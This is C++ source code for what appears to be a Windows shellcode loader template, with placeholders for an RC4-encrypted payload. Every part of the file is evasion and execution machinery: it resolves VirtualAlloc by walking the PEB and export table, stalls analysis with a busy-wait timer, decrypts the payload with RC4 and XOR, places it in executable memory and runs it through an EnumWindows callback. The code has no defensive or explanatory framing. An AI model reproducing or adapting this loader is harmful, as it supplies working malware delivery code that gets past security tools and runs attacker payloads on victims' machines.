#include <Windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <fstream>
#pragma comment(linker,"/entry:WinMain")

#define INTERVAL rand() % 26 
#define MS_PER_SECOND 1000 
#define SLEEPTIME INTERVAL*MS_PER_SECOND 

typedef LPVOID(WINAPI* pfnVirtualAlloc)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
HMODULE MyGetModuleHandle(IN LPCWSTR szModuleName);
PVOID MyGetProcAddress(HMODULE handle, LPCSTR Name);
void __alt_sleepms(size_t ms);
void rc4Decrypt(unsigned char* ciphertext, int ciphertextLength, unsigned char* key, int keyLength);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {

	HGLOBAL resHandle = NULL;
	HRSRC res;

    {{RC4_key}}
	{{payload}}

	unsigned int seed = 0;
	for (int i = 0; __TIME__[i] != '\0'; ++i) {
		if (__TIME__[i] >= '0' && __TIME__[i] <= '9') {
			seed = seed * 10 + (__TIME__[i] - '0');
		}
	}

	srand(seed);
	__alt_sleepms(SLEEPTIME * 12);

	pfnVirtualAlloc fnVirtualAlloc = (pfnVirtualAlloc)MyGetProcAddress(MyGetModuleHandle(L"kernel32.dll"), "VirtualAlloc");

	rc4Decrypt(payload, sizeof(payload), RC4key, sizeof(RC4key));
	
	unsigned char key[] = {0xbc, 0xab, 0xcb};
    for (int i=0;i<sizeof(payload);i++){
        for(int j=0;j<sizeof(key);j++){
            payload[i]^=key[j];
        }
    }


	LPVOID Memory = fnVirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(Memory, payload, sizeof(payload));
	EnumWindows((WNDENUMPROC)Memory, 0);
	return 0;
}


void rc4Decrypt(unsigned char* ciphertext, int ciphertextLength, unsigned char* key, int keyLength) {
    unsigned char S[256];
    for (int i = 0; i < 256; ++i) {
        S[i] = i;
    }

    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + S[i] + key[i % keyLength]) % 256;
        std::swap(S[i], S[j]);
    }

    int i = 0;
    j = 0;
    for (int k = 0; k < ciphertextLength; ++k) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        int t = (S[i] + S[j]) % 256;
        ciphertext[k] ^= S[t];
    }
}

BOOL StringEq(IN LPCWSTR s1, IN LPCWSTR s2) {

    WCHAR  lStr1[MAX_PATH],
        lStr2[MAX_PATH];

    int    len1 = lstrlenW(s1),
        len2 = lstrlenW(s2);

    int    i = 0,
        j = 0;

    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;

    for (i = 0; i < len1; i++) {
        lStr1[i] = (WCHAR)tolower(s1[i]);
    }
    lStr1[i++] = L'\0';


    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(s2[j]);
    }
    lStr2[j++] = L'\0';


    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;

    return FALSE;

}

HMODULE MyGetModuleHandle(IN LPCWSTR szModuleName) {


#ifdef _WIN64 
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);


    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);


    while (pDte) {
        if (pDte->FullDllName.Length != 0) {
            if (StringEq(pDte->FullDllName.Buffer, szModuleName)) {

#ifdef STRUCTS
                return (HMODULE)(pDte->InMemoryOrderLinks.Flink);
#else
                return (HMODULE)(pDte->Reserved2[0]);
#endif

            }
        }
        else {
            break;
        }
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;

}


PVOID MyGetProcAddress(HMODULE handle, LPCSTR Name) {
    PBYTE pBase = (PBYTE)handle;

    PIMAGE_DOS_HEADER pdosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (pdosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pdosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    IMAGE_OPTIONAL_HEADER peOptionHeader = pImageNtHeaders->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pExportVirtualAddress = (PIMAGE_EXPORT_DIRECTORY)(pBase + peOptionHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pExportVirtualAddress->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pExportVirtualAddress->AddressOfFunctions);
    PWORD ordinArray = (PWORD)(pBase + pExportVirtualAddress->AddressOfNameOrdinals);


    for (DWORD i = 0; i < pExportVirtualAddress->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID functionAddress = (PVOID)(pBase + FunctionAddressArray[ordinArray[i]]);

        if (strcmp(Name, pFunctionName) == 0) {
            return functionAddress;
        }
    }
    return nullptr;
}


typedef NTSTATUS(WINAPI* pSystemFunction032)(PVOID, PVOID);

unsigned long long __get_timestamp()
{
    const size_t UNIX_TIME_START = 0x019DB1DED53E8000;
    const size_t TICKS_PER_MILLISECOND = 1000;
    LARGE_INTEGER time;
    time.LowPart = *(DWORD*)(0x7FFE0000 + 0x14);
    time.HighPart = *(long*)(0x7FFE0000 + 0x1c);
    return (unsigned long long)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
}

void __alt_sleepms(size_t ms)
{
    volatile size_t x = rand();
    const unsigned long long end = __get_timestamp() + ms;
    while (__get_timestamp() < end) { x += 1; }
    if (__get_timestamp() - end > 2000) return;

}